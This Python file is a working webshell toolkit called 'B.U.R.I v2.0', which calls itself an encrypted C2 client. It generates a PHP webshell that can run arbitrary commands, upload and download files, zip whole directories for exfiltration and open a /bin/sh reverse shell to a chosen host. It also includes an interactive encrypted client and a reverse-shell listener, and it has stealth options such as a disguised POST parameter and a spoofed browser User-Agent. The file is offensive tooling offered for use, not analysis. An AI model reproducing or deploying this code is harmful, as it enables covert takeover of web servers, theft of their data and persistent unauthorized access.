#!/usr/bin/env python3
import requests
import sys
import os
import argparse
import base64
import json
import time
import re
import glob
import threading
from rich.text import Text
import socketserver
from urllib.parse import urlparse
from typing import Optional, List, Dict, Any, Callable
from hashlib import sha256

# --- UI & Interaction Libraries ---
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.syntax import Syntax
from rich.status import Status
from rich.align import Align
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import Completer, Completion

# --- Cryptography Library ---
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ==============================================================================
# SECTION: CRYPTOGRAPHY & CONNECTION HANDLING
# ==============================================================================

class CryptoHandler:
    """Handles AES-GCM encryption and decryption for secure communication."""
    def __init__(self, key: bytes):
        if len(key) != 32:
            raise ValueError("AES key must be 32 bytes long.")
        self.key = key

    def encrypt(self, plaintext: str) -> str:
        """Encrypts plaintext and returns a Base64 encoded string: nonce:tag:ciphertext."""
        try:
            data = plaintext.encode('utf-8')
            cipher = AES.new(self.key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            parts = [base64.b64encode(x).decode('utf-8') for x in (cipher.nonce, tag, ciphertext)]
            return ":".join(parts)
        except Exception as e:
            return f"ENCRYPTION_ERROR:{e}"

    def decrypt(self, encrypted_str: str) -> Optional[str]:
        """Decrypts the Base64 encoded string and returns plaintext."""
        try:
            b64_nonce, b64_tag, b64_ciphertext = encrypted_str.split(':')
            nonce, tag, ciphertext = base64.b64decode(b64_nonce), base64.b64decode(b64_tag), base64.b64decode(b64_ciphertext)
            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode('utf-8')
        except (ValueError, KeyError):
            return None

class ConnectionManager:
    """Manages the HTTP session and request/response encryption."""
    def __init__(self, url: str, password: str, param: str = 'data', proxy: Optional[str] = None):
        self.url = url
        self.param = param
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'})
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.crypto = CryptoHandler(sha256(password.encode('utf-8')).digest())

    def send_request(self, payload_data: dict, timeout: int = 30) -> dict:
        """Encrypts, sends, and decrypts a request."""
        try:
            encrypted_payload = self.crypto.encrypt(json.dumps(payload_data))
            response = self.session.post(self.url, data={self.param: encrypted_payload}, timeout=timeout)
            response.raise_for_status()

            decrypted_response = self.crypto.decrypt(response.text)
            if not decrypted_response:
                return {'status': 'error', 'message': "Decryption failed. Incorrect password or tampered response."}

            return json.loads(decrypted_response)
        except requests.RequestException as e:
            return {'status': 'error', 'message': f"Request Error: {e}"}
        except (json.JSONDecodeError, TypeError):
            return {'status': 'error', 'message': "Failed to decode JSON. Is this a B.U.R.I v2.0 webshell?"}

# ==============================================================================
# SECTION: REVERSE SHELL HANDLER
# ==============================================================================

class ReverseShellHandler(socketserver.BaseRequestHandler):
    """Handles incoming reverse shell connections."""
    def handle(self):
        console = Console()
        console.print(f"\n[bold green][+] Reverse shell connected from: {self.client_address[0]}[/bold green]")

        try:
            while True:
                cmd = console.input("[bold red]rev-shell>[/bold red] ")
                if cmd.lower() in ['exit', 'quit']:
                    self.request.sendall(b'exit\n')
                    break
                self.request.sendall(cmd.encode() + b'\n')
                self.request.settimeout(2)
                try:
                    # Read until we stop receiving data
                    response = b""
                    while True:
                        data = self.request.recv(4096)
                        if not data: break
                        response += data
                        if len(data) < 4096: break
                    console.print(response.decode('utf-8', errors='ignore').strip())
                except socket.timeout:
                    continue # No output received, just show prompt again
        except Exception as e:
            console.print(f"[bold red]Reverse shell error: {e}[/bold red]")
        finally:
            console.print("[bold yellow]Reverse shell connection closed.[/bold yellow]")

# ==============================================================================
# SECTION: MAIN WEBSHELL CLASS
# ==============================================================================

class RemoteCompleter(Completer):
    """Auto-completes remote paths using `ls`."""
    def __init__(self, shell_instance):
        self.shell = shell_instance
        self.cache = {}

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        if not text or not text.startswith(('cd ', 'ls ', 'download ', 'cat ', 'edit ')):
            return

        parts = text.split()
        if len(parts) < 2: return

        path_to_complete = parts[-1]

        # Determine the base directory for ls
        if '/' in path_to_complete:
            base_dir = os.path.dirname(path_to_complete)
        else:
            base_dir = '.'

        # Basic caching to avoid repeated requests
        if base_dir not in self.cache:
            # Use a lightweight command to get directory and file listings
            res = self.shell.execute_command(f"ls -p {self.shell.current_path}/{base_dir}")
            if res.get('status') == 'success':
                self.cache[base_dir] = res.get('output', '').splitlines()
            else:
                self.cache[base_dir] = []

        for item in self.cache[base_dir]:
            full_path = os.path.join(base_dir, item) if base_dir != '.' else item
            if full_path.startswith(path_to_complete):
                yield Completion(full_path, start_position=-len(path_to_complete))


class WebShell:
    """A modular, stateful webshell client with an encrypted channel and rich UI."""
    def __init__(self, url: str, password: str, param: str, proxy: Optional[str] = None):
        self.conn = ConnectionManager(url, password, param, proxy)
        self.hostname = urlparse(self.conn.url).hostname
        self.console = Console()
        self.current_user = "user"
        self.current_path = "~"
        self.is_windows = False
        self.modules: Dict[str, Any] = {}
        self.aliases: Dict[str, str] = {}

    def load_modules(self):
        """Dynamically loads command modules from the 'modules' directory."""
        module_path = os.path.join(os.path.dirname(__file__), "modules", "*.py")
        for f in glob.glob(module_path):
            module_basename = os.path.basename(f)
            # Skip the __init__.py file AND the base_module.py template
            if module_basename in ["__init__.py", "base_module.py"]:
                continue

            module_name = module_basename[:-3]
            try:
                spec = __import__(f"modules.{module_name}", fromlist=["Module"])
                module_class = getattr(spec, "Module")
                instance = module_class(self)
                for cmd in instance.commands:
                    self.modules[cmd] = instance
                # self.console.print(f"[dim]Loaded module: {module_name}[/dim]") # Optional: uncomment for debug
            except Exception as e:
                self.console.print(f"[bold red]Failed to load module {module_name}: {e}[/bold red]")

    def _test_connection(self) -> bool:
        """Tests the encrypted connection."""
        with self.console.status("[bold yellow]Establishing secure channel...", spinner="dots12"):
            time.sleep(1.5)
            data = self.execute_command('echo "OK"')
            if "OK" in data.get('output', ''):
                self.console.print("[bold green]✅ Secure channel established.[/bold green]")
                uname_out = self.execute_command("uname -s").get('output', '').strip().lower()
                self.is_windows = 'windows' in uname_out
                return True
            else:
                self.console.print(Panel(f"[bold red]Connection Failed:[/bold red]\n{data.get('message', 'No response')}", border_style="red"))
                return False

    def execute_command(self, command: str, timeout: int = 30) -> dict:
        """Executes a command within the context of the current remote directory."""
        full_command = f"cd {self.current_path} && {command}"
        payload = {'action': 'exec', 'cmd': full_command}
        return self.conn.send_request(payload, timeout)

    def _update_prompt_info(self):
        """Fetches user and path to build the prompt."""
        user_cmd = 'whoami' if not self.is_windows else 'echo %USERNAME%'
        path_cmd = 'pwd' if not self.is_windows else 'cd'

        user_data = self.execute_command(user_cmd)
        if user_data.get('status') == 'success':
            self.current_user = user_data['output'].strip()

        path_data = self.execute_command(path_cmd)
        if path_data.get('status') == 'success':
            self.current_path = path_data['output'].strip()

    def handle_output(self, output: str):
        """Renders command output with syntax highlighting if appropriate."""
        if any(c in output for c in '{}[]<>/;:'):
            try:
                lexer_name = Syntax.guess_lexer(output)
                self.console.print(Syntax(output, lexer_name, theme="monokai", line_numbers=True, word_wrap=True))
            except Exception:
                self.console.print(Panel(output, expand=False, border_style="yellow"))
        else:
            self.console.print(Panel(output, expand=False, border_style="yellow"))

    def interactive_shell(self):
        """Starts the main interactive shell loop."""
        print_banner(self.console)
        self.load_modules()
        if not self._test_connection(): return
        self._update_prompt_info()

        history = FileHistory('.buri_history')
        style = Style.from_dict({
            'username': 'bold #44ff44', 'at': '#bbbbbb', 'hostname': 'bold #00aaff',
            'colon': '#bbbbbb', 'path': 'bold #00ffff', 'prompt': '#ffffff',
        })

        while True:
            try:
                prompt_parts = [
                    ('class:username', self.current_user), ('class:at', '@'),
                    ('class:hostname', self.hostname), ('class:colon', ':'),
                    ('class:path', self.current_path), ('class:prompt', '$ '),
                ]
                cmd_input = prompt(prompt_parts, history=history, style=style, auto_suggest=AutoSuggestFromHistory(), completer=RemoteCompleter(self)).strip()
                if not cmd_input: continue

                # Handle local commands
                if cmd_input.lower() == 'exit':
                    self.console.print("\n[bold yellow]Session closed.[/bold yellow]")
                    break
                if cmd_input.lower() == 'clear':
                    self.console.clear()
                    continue

                # Alias expansion
                first_word = cmd_input.split()[0]
                if first_word in self.aliases:
                    cmd_input = self.aliases[first_word] + cmd_input[len(first_word):]
                    self.console.print(f"[dim italic]Executing alias: {cmd_input}[/dim]")

                parts = cmd_input.split()
                command = parts[0].lower()
                args = parts[1:]

                if command in self.modules:
                    # Pass the command itself as the first argument to the module's handler
                    self.modules[command].execute([command] + args)
                else:
                    data = self.execute_command(cmd_input)
                    output = data.get('output', '').strip()
                    if data.get('status') == 'error':
                        self.console.print(Panel(data.get('message', 'Unknown error'), border_style="red"))
                    elif output:
                        self.handle_output(output)

            except KeyboardInterrupt:
                continue
            except (EOFError, SystemExit):
                self.console.print("\n[bold yellow]Session closed.[/bold yellow]")
                break
            except Exception as e:
                self.console.print(f"[bold red]Shell Error:[/bold red] {e}")

# ==============================================================================
# SECTION: UI & HELPER FUNCTIONS
# ==============================================================================
def print_banner(console: Console):
    """Prints the application banner."""
    ascii_art = r"""
[bold blue] ____  _  _ ____  _   [/bold blue]
[bold blue]| __ )| | | |  _ \| |  [/bold blue]
[bold blue]|  _ \| | | | |_) | |  [/bold blue]
[bold blue]| |_) | |_| |  _ <|_|  [/bold blue]
[bold blue]|____/ \___/|_| \_(_)  [/bold blue]
"""
    banner_content = Text.from_markup(f"{ascii_art}\n--- [cyan]Encrypted C2 Webshell Client | By Anonre[/cyan] ---")
    console.print(Panel(Align.center(banner_content), title="[bold yellow]B.U.R.I[/bold yellow]", subtitle="[cyan]v2.0[/cyan]", border_style="magenta", expand=False, padding=(1, 5)))

def generate_webshell(file_path: str, password: str):
    """Generates the advanced PHP webshell payload."""
    console = Console()
    # All literal braces { and } in the PHP code are doubled to {{ and }} respectively
    # to escape them for Python's .format() method.
    php_code = r"""<?php
// B.U.R.I v2.0 - Modular Encrypted Webshell
@error_reporting(0);
@session_start();

class BuriHandler {{
    private $key;

    public function __construct($password) {{
        $this->key = substr(hash('sha256', $password, true), 0, 32);
    }}

    private function send_response($data) {{
        header('Content-Type: text/plain');
        $iv = openssl_random_pseudo_bytes(12);
        $tag = '';
        $ciphertext = openssl_encrypt(json_encode($data), 'aes-256-gcm', $this->key, OPENSSL_RAW_DATA, $iv, $tag, '', 16);
        echo base64_encode($iv) . ':' . base64_encode($tag) . ':' . base64_encode($ciphertext);
        exit;
    }}

    private function handle_error($message) {{
        $this->send_response(['status' => 'error', 'message' => $message]);
    }}

    private function action_exec($request) {{
        if (!isset($request['cmd'])) {{ throw new Exception('No command provided.'); }}
        $output = shell_exec($request['cmd'] . ' 2>&1');
        return ['output' => $output !== null ? $output : ''];
    }}

    private function action_upload($request) {{
        if (!isset($request['path'], $request['data'])) {{ throw new Exception('Path or data not provided.'); }}
        if (file_put_contents($request['path'], base64_decode($request['data'])) === false) {{
            throw new Exception('Failed to write file. Check permissions.');
        }}
        return ['message' => 'File uploaded successfully.'];
    }}

    private function action_download($request) {{
        if (!isset($request['path'])) {{ throw new Exception('Path not provided.'); }}
        if (!is_readable($request['path'])) {{ throw new Exception('File not found or not readable.'); }}
        return ['data' => base64_encode(file_get_contents($request['path']))];
    }}

    private function action_archive($request) {{
        if (!isset($request['path'])) {{ throw new Exception('Path not provided.'); }}
        $path = rtrim($request['path'], '/');
        if (!file_exists($path)) {{ throw new Exception('Directory not found.'); }}

        $zip_file = tempnam(sys_get_temp_dir(), 'buri_archive') . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {{
            throw new Exception("Could not open archive");
        }}

        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::LEAVES_ONLY);
        foreach ($files as $name => $file) {{
            if (!$file->isDir()) {{
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($path) + 1);
                $zip->addFile($filePath, $relativePath);
            }}
        }}
        $zip->close();
        $zip_data = base64_encode(file_get_contents($zip_file));
        unlink($zip_file);
        return ['data' => $zip_data];
    }}

    private function action_php_interactive($request) {{
        $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $process = proc_open('php -a', $descriptorspec, $pipes);
        if (!is_resource($process)) {{ throw new Exception('Failed to open interactive PHP shell.'); }}

        // Write command, then read output
        fwrite($pipes[0], $request['cmd'] . "\n");
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[2]);
        proc_close($process);

        return ['output' => $output, 'stderr' => $stderr];
    }}

    private function action_reverse_shell($request) {{
        if (!isset($request['host'], $request['port'])) {{ throw new Exception('Host or port not provided.'); }}
        $sock = fsockopen($request['host'], (int)$request['port']);
        $proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
        return ['message' => 'Reverse shell initiated.'];
    }}

    public function run($post_param) {{
        if (!isset($_POST[$post_param])) {{ $this->handle_error('Bad Request.'); }}

        $encrypted_parts = explode(':', $_POST[$post_param]);
        if (count($encrypted_parts) !== 3) {{ $this->handle_error('Invalid payload format.'); }}

        list($iv_b64, $tag_b64, $cipher_b64) = $encrypted_parts;
        $decrypted_payload = openssl_decrypt(base64_decode($cipher_b64), 'aes-256-gcm', $this->key, OPENSSL_RAW_DATA, base64_decode($iv_b64), base64_decode($tag_b64));

        if ($decrypted_payload === false) {{ $this->handle_error('Decryption failed.'); }}

        $request = json_decode($decrypted_payload, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($request['action'])) {{
            $this->handle_error('Invalid JSON in decrypted payload.');
        }}

        $action_method = 'action_' . $request['action'];
        if (!method_exists($this, $action_method)) {{
            $this->handle_error('Invalid action specified.');
        }}

        try {{
            $response_data = $this->$action_method($request);
            $this->send_response(array_merge(['status' => 'success'], $response_data));
        }} catch (Exception $e) {{
            $this->handle_error($e->getMessage());
        }}
    }}
}}

// Execution logic
$password = '{0}';
$param_name = '{1}';
$buri = new BuriHandler($password);
$buri->run($param_name);
?>"""
    try:
        # The .format() method now correctly fills {0} and {1} and converts {{ to {
        content = php_code.format(password, "data").strip()
        with open(file_path, 'w') as file:
            file.write(content)
        console.print(f"[green]✅ Success! Encrypted webshell saved to:[/green] [yellow]{file_path}[/yellow]")
    except IOError as e:
        console.print(f"[red]Error creating webshell: {e}[/red]")
        sys.exit(1)

os.environ['TERM'] = os.environ.get('TERM', 'xterm-256color')

# Create a console object
console = Console()

def main():
    """The main entry point for the B.U.R.I command-line tool."""
    console.print("[bold green]Welcome to B.U.R.I![/bold green]")

    # Argument parser setup
    parser = argparse.ArgumentParser(
        description="B.U.R.I v2.0 - A Modular Webshell Client",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Example usage:\n"
               "  Create shell: buri create --path shell.php --password 'SuperSecretPass123'\n"
               "  Run shell:    buri run https://example.com/shell.php -p 'SuperSecretPass123'\n"
               "  Stealth mode: buri run <url> -p <pass> --param 'sessionid'\n"
               "  Rev shell:    buri listen --lhost 0.0.0.0 --lport 4444 (then run 'revshell <ip> <port>' in client)"
    )
    subparsers = parser.add_subparsers(dest='action', required=True)

    # Create subparser
    create_parser = subparsers.add_parser('create', help='Create an advanced, encrypted PHP webshell.')
    create_parser.add_argument('--path', required=True, help='Path to save the webshell file (e.g., shell.php).')
    create_parser.add_argument('--password', required=True, help='Password for webshell encryption and access.')

    # Run subparser
    run_parser = subparsers.add_parser('run', help='Run an interactive session on a remote webshell.')
    run_parser.add_argument('url', help='URL of the webshell.')
    run_parser.add_argument('-p', '--password', required=True, help='Password for webshell access.')
    run_parser.add_argument('--param', default='data', help="Name of the POST parameter to use (default: 'data').")
    run_parser.add_argument('--proxy', help='Optional proxy server (e.g., http://127.0.0.1:8080).')

    # Listen subparser
    listen_parser = subparsers.add_parser('listen', help='Start a listener for a reverse shell.')
    listen_parser.add_argument('--lhost', default='0.0.0.0', help='Local host to listen on.')
    listen_parser.add_argument('--lport', required=True, type=int, help='Local port to listen on.')

    # Parse arguments
    args = parser.parse_args()

    # Handle actions based on subcommand
    try:
        if args.action == "create":
            console.print(f"[bold blue]Creating webshell at {args.path}...[/bold blue]")
            generate_webshell(args.path, args.password)
            console.print(f"[bold green]Webshell created successfully at {args.path}.[/bold green]")
        elif args.action == "run":
            console.print(f"[bold blue]Starting interactive session with {args.url}...[/bold blue]")
            shell = WebShell(args.url, args.password, args.param, args.proxy)
            shell.interactive_shell()
            console.print(f"[bold green]Interactive session ended.[/bold green]")
        elif args.action == "listen":
            console.print(f"[bold yellow]Starting reverse shell listener on {args.lhost}:{args.lport}...[/bold yellow]")
            with socketserver.TCPServer((args.lhost, args.lport), ReverseShellHandler) as server:
                server.serve_forever()
    except Exception as e:
        console.print(f"[bold red]Error: {str(e)}[/bold red]")
        sys.exit(1)

if __name__ == "__main__":
    main()